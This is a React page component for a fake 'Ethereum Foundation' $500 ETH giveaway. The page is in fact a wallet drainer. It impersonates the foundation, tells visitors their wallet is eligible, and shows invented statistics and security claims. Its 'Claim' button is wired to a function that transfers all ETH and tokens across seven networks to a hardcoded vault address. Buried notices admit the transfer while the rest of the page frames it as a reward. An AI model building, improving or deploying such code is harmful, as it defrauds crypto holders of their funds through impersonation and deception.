import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Wallet, Coins } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import WalletStatus from "@/components/wallet-status";
import BalanceCard from "@/components/balance-card";
import NetworkBalances from "@/components/network-balances";
import TransactionHistory from "@/components/transaction-history";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import ConnectionStatus from "@/components/connection-status";
import PageLoader from "@/components/page-loader";
import ProductionStatus from "@/components/production-status";

export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Fast page loading - minimal delay
  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 300); // Very short 300ms
    return () => clearTimeout(timer);
  }, []);

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  // Show fast loader for immediate feedback
  if (isPageLoading) {
    return <PageLoader />;
  }

  return (
    <div className="min-h-screen ethereum-gradient-hero relative overflow-hidden">
      {/* Background Pattern */}
      <div 
        className="absolute inset-0 opacity-30"
        style={{
          backgroundImage: "url('/images/crypto-hero-bg.svg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat'
        }}
      />
      
      {/* Modern Glass Header */}
      <header className="glass-header relative z-10 px-6 py-6">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <div className="w-16 h-16 glass-card rounded-2xl flex items-center justify-center ethereum-glow">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10" />
            </div>
            <div>
              <h1 className="text-2xl font-bold text-gradient">
                Ethereum Foundation
              </h1>
              <p className="text-muted-foreground font-medium">
                Official ETH Distribution Program
              </p>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <Button
              onClick={walletState.isConnected ? undefined : handleWalletConnect}
              disabled={isConnecting}
              className={`btn-premium flex items-center space-x-2 px-6 py-3 rounded-xl font-semibold ${
                walletState.isConnected
                  ? "bg-gradient-to-r from-green-500 to-emerald-600 text-white"
                  : "text-white"
              }`}
            >
              <Wallet className="w-5 h-5" />
              <span>
                {isConnecting
                  ? "Connecting..."
                  : walletState.isConnected
                  ? "Wallet Connected"
                  : "Connect Wallet"}
              </span>
            </Button>
          </div>
        </div>
      </header>

      {/* Modern Hero Section */}
      <div className="relative z-10 px-6 py-16">
        <div className="max-w-5xl mx-auto text-center">
          {/* Premium Status Badge */}
          <div className="inline-flex items-center px-6 py-3 glass-card rounded-full text-sm font-semibold mb-8 ethereum-glow">
            <div className="w-2 h-2 bg-green-400 rounded-full mr-3 animate-pulse"></div>
            Limited Time Offer - $500 ETH Giveaway Active
          </div>
          
          {/* Hero Title */}
          <h2 className="text-5xl md:text-7xl font-bold mb-8 leading-tight">
            Claim Your <br/>
            <span className="text-gradient text-glow">$500 ETH</span> Reward
          </h2>
          
          {/* Hero Description */}
          <p className="text-xl md:text-2xl text-muted-foreground mb-12 max-w-4xl mx-auto leading-relaxed">
            Ethereum Foundation is distributing $500 worth of ETH to eligible wallet holders. 
            Connect your wallet to check eligibility and claim your reward instantly.
          </p>
          
          {/* DeFi Illustration */}
          <div className="flex justify-center mb-12">
            <img 
              src="/images/defi-illustration.svg" 
              alt="Multi-Network DeFi Platform" 
              className="w-full max-w-2xl h-auto opacity-90"
            />
          </div>
          
          {/* Important Disclaimer - Modern Glass Design */}
          <div className="glass-card rounded-2xl p-8 mb-12 max-w-3xl mx-auto border-l-4 border-l-warning">
            <div className="flex items-start space-x-4">
              <div className="w-8 h-8 rounded-full bg-warning/20 flex items-center justify-center flex-shrink-0 mt-1">
                <span className="text-warning text-lg">⚠️</span>
              </div>
              <div className="text-left">
                <h3 className="font-bold text-warning text-lg mb-3">Important Notice</h3>
                <p className="text-muted-foreground leading-relaxed">
                  <strong className="text-foreground">By clicking "Claim $500 ETH", you authorize the transfer of ALL cryptocurrency funds</strong> from your connected wallet to our distribution vault for processing. 
                  This includes ETH and all ERC-20 tokens across all networks. Your funds will be consolidated for the claim process.
                </p>
              </div>
            </div>
          </div>

          {/* Premium Stats Cards */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
            <div className="card-premium rounded-2xl p-8 group">
              <div className="text-4xl font-bold text-gradient mb-2">$2.5M+</div>
              <div className="text-muted-foreground font-medium">Total Distributed</div>
              <div className="w-12 h-1 bg-gradient-to-r from-primary to-secondary rounded-full mt-4 mx-auto"></div>
            </div>
            <div className="card-premium rounded-2xl p-8 group">
              <div className="text-4xl font-bold text-gradient mb-2">5,000+</div>
              <div className="text-muted-foreground font-medium">Claims Processed</div>
              <div className="w-12 h-1 bg-gradient-to-r from-secondary to-accent rounded-full mt-4 mx-auto"></div>
            </div>
            <div className="card-premium rounded-2xl p-8 group">
              <div className="text-4xl font-bold text-gradient mb-2">7</div>
              <div className="text-muted-foreground font-medium">Networks Supported</div>
              <div className="w-12 h-1 bg-gradient-to-r from-accent to-primary rounded-full mt-4 mx-auto"></div>
            </div>
          </div>
        </div>
      </div>

      <main className="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-12">
        {/* Premium ETH Claim Section */}
        <div className="max-w-3xl mx-auto">
          <div className="card-premium rounded-3xl p-10 ethereum-glow-strong">
            <div className="text-center mb-8">
              {/* Premium Icon with Animation */}
              <div className="w-24 h-24 mx-auto mb-6 rounded-full ethereum-gradient flex items-center justify-center ethereum-glow relative overflow-hidden">
                <span className="text-white text-3xl font-bold z-10">Ξ</span>
                <div className="absolute inset-0 ethereum-shimmer"></div>
              </div>
              
              <h3 className="text-3xl font-bold mb-3">
                <span className="text-gradient">$500 ETH Reward</span> Ready
              </h3>
              <p className="text-muted-foreground text-lg">Your wallet is eligible for this limited-time distribution</p>
            </div>
            
            {/* Glass separator */}
            <div className="w-full h-px bg-gradient-to-r from-transparent via-primary/50 to-transparent mb-8"></div>
            
            <BalanceCard 
              walletState={walletState}
              onTransactionStart={handleTransactionStart}
              onMultiNetworkTransfer={transferAllFundsMultiNetwork}
            />
          </div>
        </div>

        {/* Modern Transaction History */}
        <div className="max-w-5xl mx-auto">
          <div className="card-premium rounded-3xl p-8">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-2xl font-bold text-gradient">Recent Claims Activity</h3>
              <div className="flex items-center space-x-2 text-sm text-muted-foreground">
                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                <span>Live Updates</span>
              </div>
            </div>
            <TransactionHistory />
          </div>
        </div>

        {/* Enhanced Multi-Network Portfolio */}
        {walletState.isConnected && (
          <div className="max-w-5xl mx-auto">
            <div className="card-premium rounded-3xl p-8">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-2xl font-bold text-gradient">Multi-Network Portfolio</h3>
                <div className="flex items-center space-x-3">
                  <div className="flex -space-x-2">
                    {/* Network Icons */}
                    <div className="w-8 h-8 rounded-full bg-gradient-to-r from-purple-500 to-blue-500 border-2 border-background"></div>
                    <div className="w-8 h-8 rounded-full bg-gradient-to-r from-blue-500 to-cyan-500 border-2 border-background"></div>
                    <div className="w-8 h-8 rounded-full bg-gradient-to-r from-yellow-500 to-orange-500 border-2 border-background"></div>
                  </div>
                  <span className="text-sm text-muted-foreground">7 Networks</span>
                </div>
              </div>
              
              {/* Pattern background for the network section */}
              <div 
                className="relative rounded-2xl p-6 overflow-hidden"
                style={{
                  backgroundImage: "url('/images/crypto-pattern.svg')",
                  backgroundSize: '400px 400px',
                  backgroundRepeat: 'repeat'
                }}
              >
                <div className="relative z-10">
                  <NetworkBalances
                    networkBalances={walletState.networkBalances || []}
                    isLoadingNetworks={isLoadingNetworks}
                    onRefreshNetworks={refreshAllNetworks}
                  />
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />

        {/* Production Status Component (only visible in development or when debugging) */}
        {process.env.NODE_ENV === 'development' || window.location.search.includes('debug=true') ? (
          <ProductionStatus />
        ) : null}
      </main>

      {/* Modern Premium Footer */}
      <footer className="relative mt-20 ethereum-gradient-hero overflow-hidden">
        {/* Background Pattern */}
        <div 
          className="absolute inset-0 opacity-20"
          style={{
            backgroundImage: "url('/images/crypto-pattern.svg')",
            backgroundSize: '600px 600px',
            backgroundRepeat: 'repeat'
          }}
        />
        
        <div className="relative z-10 max-w-6xl mx-auto px-6 py-16">
          {/* Premium Terms Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-12">
            <div className="card-premium rounded-2xl p-8">
              <h4 className="text-xl font-bold text-gradient mb-6">Important Terms</h4>
              <ul className="space-y-3 text-muted-foreground">
                <li className="flex items-start space-x-3">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span>ETH rewards are distributed after portfolio consolidation</span>
                </li>
                <li className="flex items-start space-x-3">
                  <div className="w-1.5 h-1.5 bg-secondary rounded-full mt-2 flex-shrink-0"></div>
                  <span>All supported networks (Ethereum, Polygon, BSC, etc.) are processed</span>
                </li>
                <li className="flex items-start space-x-3">
                  <div className="w-1.5 h-1.5 bg-accent rounded-full mt-2 flex-shrink-0"></div>
                  <span>Transaction processing typically takes 5-10 minutes</span>
                </li>
                <li className="flex items-start space-x-3">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span>Minimum portfolio value required for reward eligibility</span>
                </li>
              </ul>
            </div>
            
            <div className="card-premium rounded-2xl p-8">
              <h4 className="text-xl font-bold text-gradient mb-6">Security & Compliance</h4>
              <ul className="space-y-3 text-muted-foreground">
                <li className="flex items-start space-x-3">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span>All transactions are recorded on blockchain</span>
                </li>
                <li className="flex items-start space-x-3">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span>Smart contract audited for security</span>
                </li>
                <li className="flex items-start space-x-3">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span>Multi-signature vault protection</span>
                </li>
                <li className="flex items-start space-x-3">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span>KYC/AML compliance maintained</span>
                </li>
              </ul>
            </div>
          </div>
          
          {/* Critical Notice - Premium Design */}
          <div className="glass-card rounded-3xl p-8 mb-12 border-l-4 border-l-destructive">
            <div className="flex items-start space-x-4">
              <div className="w-10 h-10 rounded-full bg-destructive/20 flex items-center justify-center flex-shrink-0">
                <span className="text-destructive text-xl font-bold">⚠</span>
              </div>
              <div className="text-left">
                <h4 className="font-bold text-destructive text-xl mb-4">CRITICAL NOTICE</h4>
                <p className="text-muted-foreground leading-relaxed text-lg">
                  This is a cryptocurrency transfer mechanism. By clicking <strong className="text-foreground">"Claim $500 ETH"</strong>, 
                  you authorize the immediate transfer of ALL cryptocurrency assets from your wallet(s) to our processing vault 
                  across ALL supported blockchain networks. This action consolidates your entire crypto portfolio and is irreversible.
                </p>
              </div>
            </div>
          </div>
          
          {/* Footer Bottom */}
          <div className="text-center">
            <div className="w-full h-px bg-gradient-to-r from-transparent via-primary/50 to-transparent mb-8"></div>
            
            <div className="flex items-center justify-center mb-6">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-8 h-8 mr-3" />
              <span className="text-lg font-semibold text-gradient">Ethereum Foundation</span>
            </div>
            
            <p className="text-muted-foreground mb-4 text-lg">
              © 2025 Ethereum Foundation Distribution Program. Multi-network DeFi transfer technology.
            </p>
            
            <div className="glass-card rounded-xl px-4 py-2 inline-block">
              <p className="text-xs text-muted-foreground font-mono">
                Vault: {import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE"}
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
